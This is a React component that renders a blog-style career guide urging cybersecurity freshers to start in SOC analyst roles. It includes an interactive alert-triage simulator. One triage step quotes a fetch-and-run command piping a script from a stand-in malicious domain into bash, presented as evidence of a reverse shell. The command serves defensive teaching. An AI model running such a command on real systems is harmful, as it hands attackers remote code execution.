'use client';
import { useState, useEffect } from 'react';
import {
  X,
  Clock,
  User,
  Calendar,
  Shield,
  Terminal,
  CheckCircle2,
  AlertTriangle,
  ChevronRight,
  Zap,
  TrendingUp,
  Award,
  BookOpen,
  ArrowRight,
  Share2,
  Check,
  ShieldAlert
} from 'lucide-react';

interface BlogPostModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function BlogPostModal({ isOpen, onClose }: BlogPostModalProps) {
  const [copied, setCopied] = useState(false);
  const [activeStep, setActiveStep] = useState(0);
  const [triageVerdict, setTriageVerdict] = useState<'pending' | 'true-positive' | 'false-positive'>('pending');

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') onClose();
    };
    if (isOpen) {
      document.body.style.overflow = 'hidden';
      window.addEventListener('keydown', handleKeyDown);
    }
    return () => {
      document.body.style.overflow = 'auto';
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const triageSteps = [
    {
      title: '1. SIEM Alert Triggered',
      desc: 'High Severity: Multiple Failed SSH Login Attempts followed by Successful Root Access from 192.168.1.105.',
      detail: 'Timestamp: 03:14:22 UTC | Rule ID: AUTH_BRUTEFORCE_SUCCESS | Host: db-prod-01',
    },
    {
      title: '2. Log Analysis & IP Context',
      desc: 'Checking Threat Intelligence feed for IP 192.168.1.105 and inspecting system auth logs.',
      detail: '500+ failed attempts in 3 minutes. Source IP belongs to an unapproved internal subnet jump host.',
    },
    {
      title: '3. Process & Network Inspection',
      desc: 'EDR shows user executed `curl http://malicious-domain.xyz/script.sh | bash` immediately after login.',
      detail: 'Process tree: sshd -> bash -> curl -> bash (downloads suspicious script into /tmp/rev_shell)',
    },
    {
      title: '4. Containment & Escalation',
      desc: 'Isolate `db-prod-01` host from network via EDR, terminate malicious PID, notify L2 Incident Response.',
      detail: 'Verdict: True Positive (Brute force + Unauthorized Remote Code Execution). Escalated to Tier 2 IR Team.',
    },
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 md:p-6 overflow-y-auto bg-black/80 backdrop-blur-md animate-fadeIn">
      {/* Modal Container */}
      <div className="relative w-full max-w-4xl max-h-[92vh] flex flex-col rounded-2xl border border-gray-800 bg-[#0f172a] shadow-2xl overflow-hidden">
        
        {/* Header bar */}
        <div className="sticky top-0 z-20 flex items-center justify-between border-b border-gray-800 bg-[#0f172a]/95 px-6 py-4 backdrop-blur-md">
          <div className="flex items-center gap-2">
            <span className="flex h-3 w-3 rounded-full bg-accent animate-pulse" />
            <span className="text-xs font-mono font-semibold uppercase tracking-wider text-accent">
              Cybersecurity Insights & Career Guide
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={handleCopyLink}
              className="flex items-center gap-1.5 rounded-lg border border-gray-700 bg-secondary/50 px-3 py-1.5 text-xs text-gray-300 transition-colors hover:bg-secondary hover:text-white"
              title="Share article link"
            >
              {copied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Share2 className="h-3.5 w-3.5" />}
              {copied ? 'Copied Link' : 'Share'}
            </button>
            <button
              onClick={onClose}
              className="rounded-lg p-2 text-gray-400 transition-colors hover:bg-white/10 hover:text-white"
              aria-label="Close modal"
            >
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>

        {/* Modal Scrollable Body */}
        <div className="flex-1 overflow-y-auto px-6 py-8 sm:px-10 md:px-12 text-gray-300 space-y-8 font-sans">
          
          {/* Article Header */}
          <header className="space-y-4 border-b border-gray-800 pb-8">
            <div className="flex flex-wrap items-center gap-3 text-xs text-gray-400">
              <span className="rounded-full bg-accent/10 border border-accent/20 px-3 py-1 text-accent font-medium">
                SOC Analyst Guide
              </span>
              <span className="flex items-center gap-1">
                <Clock className="h-3.5 w-3.5 text-cyan-400" /> 8 min read
              </span>
              <span className="flex items-center gap-1">
                <Calendar className="h-3.5 w-3.5 text-gray-400" /> August 2026
              </span>
              <span className="flex items-center gap-1">
                <User className="h-3.5 w-3.5 text-gray-400" /> By Vivek Dhawan
              </span>
            </div>

            <h1 className="text-2xl sm:text-3xl md:text-4xl font-extrabold text-white leading-tight">
              Why SOC Roles Are the Best Starting Point for Any Fresher Entering Cybersecurity
            </h1>

            <p className="text-base sm:text-lg text-gray-300 leading-relaxed font-normal italic">
              "How do I get experience in cybersecurity if every entry-level job requires 3 years of experience?" 
              Here is why starting as a SOC Analyst (Tier 1) breaks the experience barrier and builds the strongest foundation for your cybersecurity career.
            </p>
          </header>

          {/* Table of Contents Box */}
          <div className="rounded-xl border border-cyan-500/20 bg-cyan-950/20 p-5 backdrop-blur-sm">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-cyan-400 flex items-center gap-2 mb-3">
              <BookOpen className="h-4 w-4" /> Table of Contents
            </h2>
            <ul className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-sm text-gray-300">
              <li>
                <a href="#section-1" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 1. The Experience Paradox
                </a>
              </li>
              <li>
                <a href="#section-2" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 2. Exposure to Real-World Threats
                </a>
              </li>
              <li>
                <a href="#section-3" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 3. The 3 Core Pillars You Master
                </a>
              </li>
              <li>
                <a href="#section-4" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 4. Interactive SOC Triage Demo
                </a>
              </li>
              <li>
                <a href="#section-5" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 5. Career Progression Roadmap
                </a>
              </li>
              <li>
                <a href="#section-6" className="hover:text-accent transition-colors flex items-center gap-1.5">
                  <ChevronRight className="h-3.5 w-3.5 text-accent" /> 6. Certifications & Next Steps
                </a>
              </li>
            </ul>
          </div>

          {/* Section 1 */}
          <section id="section-1" className="space-y-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <Shield className="h-6 w-6 text-accent" />
              1. Breaking the Cybersecurity "Experience Paradox"
            </h2>
            <p className="leading-relaxed">
              If you have been browsing job boards for cybersecurity entry-level roles, you have likely encountered the infamous Catch-22: 
              <strong className="text-white"> "Entry-Level Position: Requires 3-5 years of experience in Incident Response and CISSP."</strong>
            </p>
            <p className="leading-relaxed">
              Cybersecurity is rarely an "entry-level" field right out of high school or non-technical backgrounds because defenders must understand what they are defending. 
              However, <strong className="text-cyan-400">Security Operations Centers (SOCs)</strong> are the biggest exception to this rule. SOCs operate 24/7/365 and actively hire Tier-1 Analysts who possess strong fundamentals, curiosity, and a structured mindset—making SOC the primary gateway for freshers.
            </p>
          </section>

          {/* Section 2 */}
          <section id="section-2" className="space-y-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <Zap className="h-6 w-6 text-accent" />
              2. Front-Row Seat to Real-World Attacker Tactics
            </h2>
            <p className="leading-relaxed">
              Textbooks and online courses can teach you theoretical concepts like TCP three-way handshakes, SQL injections, or AES encryption. 
              However, sitting in a SOC gives you a front-row seat to <strong className="text-white">live attack patterns</strong> happening against enterprise networks.
            </p>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-4">
              <div className="rounded-xl border border-gray-800 bg-secondary/30 p-4">
                <div className="text-accent font-semibold mb-1 flex items-center gap-2">
                  <Terminal className="h-4 w-4" /> Live Alert Triage
                </div>
                <p className="text-xs text-gray-400">
                  Analyze real Splunk/Wazuh alerts, inspect suspicious emails, malware payloads, and malicious PowerShell execution.
                </p>
              </div>
              <div className="rounded-xl border border-gray-800 bg-secondary/30 p-4">
                <div className="text-accent font-semibold mb-1 flex items-center gap-2">
                  <ShieldAlert className="h-4 w-4" /> MITRE ATT&CK Mapping
                </div>
                <p className="text-xs text-gray-400">
                  Learn to map adversary behaviors to actual MITRE ATT&CK tactics (Phishing, Credential Dumping, Lateral Movement).
                </p>
              </div>
              <div className="rounded-xl border border-gray-800 bg-secondary/30 p-4">
                <div className="text-accent font-semibold mb-1 flex items-center gap-2">
                  <TrendingUp className="h-4 w-4" /> Incident Handling
                </div>
                <p className="text-xs text-gray-400">
                  Master escalation procedures, contain compromised hosts using EDR (CrowdStrike/Defender), and draft incident reports.
                </p>
              </div>
            </div>
          </section>

          {/* Section 3 */}
          <section id="section-3" className="space-y-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <CheckCircle2 className="h-6 w-6 text-accent" />
              3. The 3 Core Pillars You Master as a Tier 1 SOC Analyst
            </h2>
            <p className="leading-relaxed">
              Working in a SOC forces you to master three core technical disciplines that every specialized security domain (Pentesting, Cloud Sec, Forensics) relies upon:
            </p>
            <ul className="space-y-3 pl-2">
              <li className="flex items-start gap-3 rounded-lg border border-gray-800 bg-secondary/20 p-3">
                <span className="rounded bg-accent/20 px-2 py-1 text-xs font-mono font-bold text-accent">Pillar 1</span>
                <div>
                  <strong className="text-white">Log Analysis & SIEM Triage:</strong> Understanding syslog formats, Windows Event IDs (4624 login, 4625 failed, 4688 process creation), and writing custom queries.
                </div>
              </li>
              <li className="flex items-start gap-3 rounded-lg border border-gray-800 bg-secondary/20 p-3">
                <span className="rounded bg-cyan-500/20 px-2 py-1 text-xs font-mono font-bold text-cyan-400">Pillar 2</span>
                <div>
                  <strong className="text-white">Network Traffic & Packet Inspection:</strong> Analyzing Wireshark PCAPs, understanding DNS queries, HTTP headers, TLS handshakes, and spotting abnormal beaconing.
                </div>
              </li>
              <li className="flex items-start gap-3 rounded-lg border border-gray-800 bg-secondary/20 p-3">
                <span className="rounded bg-blue-500/20 px-2 py-1 text-xs font-mono font-bold text-blue-400">Pillar 3</span>
                <div>
                  <strong className="text-white">Endpoint Detection & Response (EDR):</strong> Investigating parent-child process trees, command-line arguments, registry modifications, and memory dumps.
                </div>
              </li>
            </ul>
          </section>

          {/* Section 4: Interactive Triage Simulator */}
          <section id="section-4" className="space-y-4 rounded-xl border border-accent/30 bg-accent/5 p-6 backdrop-blur-md">
            <div className="flex items-center justify-between">
              <h2 className="text-lg sm:text-xl font-bold text-white flex items-center gap-2">
                <Terminal className="h-5 w-5 text-accent" />
                Interactive SOC Triage Mini-Simulator
              </h2>
              <span className="text-xs font-mono bg-accent/20 text-accent px-2.5 py-1 rounded-full">
                Hands-on Demo
              </span>
            </div>
            <p className="text-sm text-gray-300">
              Click through the steps below to experience how a Tier-1 SOC Analyst triages a suspicious security alert:
            </p>

            {/* Step navigation tabs */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-2">
              {triageSteps.map((step, idx) => (
                <button
                  key={idx}
                  onClick={() => setActiveStep(idx)}
                  className={`px-3 py-2 text-xs font-medium rounded-lg border transition-all text-left ${
                    activeStep === idx
                      ? 'border-accent bg-accent/20 text-white shadow-lg shadow-accent/10'
                      : 'border-gray-800 bg-secondary/40 text-gray-400 hover:bg-secondary hover:text-gray-200'
                  }`}
                >
                  Step {idx + 1}
                </button>
              ))}
            </div>

            {/* Step content box */}
            <div className="rounded-lg border border-gray-800 bg-[#090d16] p-4 space-y-2 font-mono text-xs">
              <div className="text-accent font-bold text-sm flex items-center gap-2">
                <AlertTriangle className="h-4 w-4 text-amber-400" />
                {triageSteps[activeStep].title}
              </div>
              <p className="text-gray-300 font-sans text-sm">{triageSteps[activeStep].desc}</p>
              <div className="rounded bg-black/50 p-2.5 text-cyan-300 border border-cyan-900/40">
                <code>{triageSteps[activeStep].detail}</code>
              </div>
            </div>

            {/* Final Verdict interactive choice */}
            {activeStep === 3 && (
              <div className="pt-2 border-t border-gray-800 space-y-3">
                <span className="text-xs font-semibold text-gray-300">Select SOC Analyst Verdict:</span>
                <div className="flex gap-3">
                  <button
                    onClick={() => setTriageVerdict('true-positive')}
                    className={`px-4 py-2 text-xs font-bold rounded-lg border flex items-center gap-2 transition-colors ${
                      triageVerdict === 'true-positive'
                        ? 'bg-red-500/20 border-red-500 text-red-300'
                        : 'border-gray-800 bg-secondary/40 text-gray-300 hover:bg-red-500/10'
                    }`}
                  >
                    <AlertTriangle className="h-3.5 w-3.5 text-red-400" /> True Positive (Malicious)
                  </button>
                  <button
                    onClick={() => setTriageVerdict('false-positive')}
                    className={`px-4 py-2 text-xs font-bold rounded-lg border flex items-center gap-2 transition-colors ${
                      triageVerdict === 'false-positive'
                        ? 'bg-green-500/20 border-green-500 text-green-300'
                        : 'border-gray-800 bg-secondary/40 text-gray-300 hover:bg-green-500/10'
                    }`}
                  >
                    <CheckCircle2 className="h-3.5 w-3.5 text-green-400" /> False Positive (Benign)
                  </button>
                </div>

                {triageVerdict === 'true-positive' && (
                  <div className="p-3 rounded-lg bg-red-950/30 border border-red-800/40 text-xs text-red-300 font-sans">
                    <strong>Correct!</strong> SSH brute force succeeded followed by a curl piped to bash reverse shell. Host isolated & escalated to Tier-2 IR!
                  </div>
                )}
                {triageVerdict === 'false-positive' && (
                  <div className="p-3 rounded-lg bg-amber-950/30 border border-amber-800/40 text-xs text-amber-300 font-sans">
                    <strong>Incorrect.</strong> Downloading an unauthorized shell script via curl right after 500 failed logins indicates host compromise!
                  </div>
                )}
              </div>
            )}
          </section>

          {/* Section 5: Career Progression */}
          <section id="section-5" className="space-y-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <TrendingUp className="h-6 w-6 text-accent" />
              5. Where Can a SOC Role Take You? (Career Pathways)
            </h2>
            <p className="leading-relaxed">
              A Tier 1 SOC role is not a forever destination—it is a launching pad. After 1 to 2 years in a SOC, you have the foundational experience required to branch into almost any cybersecurity specialization:
            </p>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="rounded-xl border border-gray-800 bg-secondary/20 p-4">
                <h3 className="font-bold text-white flex items-center gap-2 mb-1">
                  <ArrowRight className="h-4 w-4 text-accent" /> Tier 2 SOC / Incident Response (IR)
                </h3>
                <p className="text-xs text-gray-400">
                  Lead deep-dive forensic investigations, malware analysis, memory dump examination, and threat eradication.
                </p>
              </div>
              <div className="rounded-xl border border-gray-800 bg-secondary/20 p-4">
                <h3 className="font-bold text-white flex items-center gap-2 mb-1">
                  <ArrowRight className="h-4 w-4 text-cyan-400" /> Penetration Testing / Red Teaming
                </h3>
                <p className="text-xs text-gray-400">
                  Because you know how defenders detect attacks, you become significantly better at offensive tactics and bypasses.
                </p>
              </div>
              <div className="rounded-xl border border-gray-800 bg-secondary/20 p-4">
                <h3 className="font-bold text-white flex items-center gap-2 mb-1">
                  <ArrowRight className="h-4 w-4 text-blue-400" /> Threat Hunting & Cyber Threat Intelligence
                </h3>
                <p className="text-xs text-gray-400">
                  Proactively hunt for undetected adversaries hiding inside network logs using IOCs and TTP hypothesis testing.
                </p>
              </div>
              <div className="rounded-xl border border-gray-800 bg-secondary/20 p-4">
                <h3 className="font-bold text-white flex items-center gap-2 mb-1">
                  <ArrowRight className="h-4 w-4 text-emerald-400" /> Cloud & Security Engineering
                </h3>
                <p className="text-xs text-gray-400">
                  Design automated security rules, SIEM pipelines, and cloud guardrails in AWS, Azure, or GCP.
                </p>
              </div>
            </div>
          </section>

          {/* Section 6: Actionable Roadmap for Freshers */}
          <section id="section-6" className="space-y-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <Award className="h-6 w-6 text-accent" />
              6. Actionable Roadmap for Freshers to Land a SOC Role
            </h2>
            <p className="leading-relaxed">
              If you are a fresher aiming to land your first SOC Analyst position, here is the exact 4-step execution roadmap:
            </p>
            <div className="space-y-3 font-sans">
              <div className="flex gap-4 items-start">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-accent/20 font-bold text-accent text-sm">
                  1
                </div>
                <div>
                  <h4 className="font-semibold text-white">Master Fundamental Networking & OS</h4>
                  <p className="text-xs text-gray-400">
                    Understand IP addressing, CIDR blocks, TCP/UDP, DNS, HTTP, Windows Event IDs, and basic Linux CLI navigation.
                  </p>
                </div>
              </div>

              <div className="flex gap-4 items-start">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-accent/20 font-bold text-accent text-sm">
                  2
                </div>
                <div>
                  <h4 className="font-semibold text-white">Build Practical Hands-on Experience (Labs)</h4>
                  <p className="text-xs text-gray-400">
                    Complete free/low-cost SOC paths on TryHackMe (SOC Level 1), Hack The Box Academy (CDSA path), or LetsDefend.
                  </p>
                </div>
              </div>

              <div className="flex gap-4 items-start">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-accent/20 font-bold text-accent text-sm">
                  3
                </div>
                <div>
                  <h4 className="font-semibold text-white">Target Entry-Level Certifications</h4>
                  <p className="text-xs text-gray-400">
                    CompTIA Security+, CompTIA CySA+, BJA (Blue Team Level 1), or Cisco CyberOps Associate.
                  </p>
                </div>
              </div>

              <div className="flex gap-4 items-start">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-accent/20 font-bold text-accent text-sm">
                  4
                </div>
                <div>
                  <h4 className="font-semibold text-white">Build & Showcase Projects on Your Portfolio</h4>
                  <p className="text-xs text-gray-400">
                    Set up a home lab SIEM (Wazuh or Splunk Free), ingest home logs, write custom detection rules, and document write-ups on GitHub.
                  </p>
                </div>
              </div>
            </div>
          </section>

          {/* Footer Call to Action */}
          <footer className="mt-8 rounded-xl border border-gray-800 bg-secondary/40 p-6 text-center space-y-4">
            <h3 className="text-lg font-bold text-white">Ready to Start Your SOC Journey?</h3>
            <p className="text-xs text-gray-400 max-w-xl mx-auto">
              SOC roles provide real security context, rapid learning curves, and clear progression. Build your lab, master the logs, and showcase your passion.
            </p>
            <div className="flex justify-center gap-3 pt-2">
              <button
                onClick={onClose}
                className="rounded-lg bg-accent px-5 py-2.5 text-xs font-semibold text-white transition-all hover:bg-accent-dark shadow-lg shadow-accent/20"
              >
                Close & Return to Portfolio
              </button>
            </div>
          </footer>

        </div>
      </div>
    </div>
  );
}
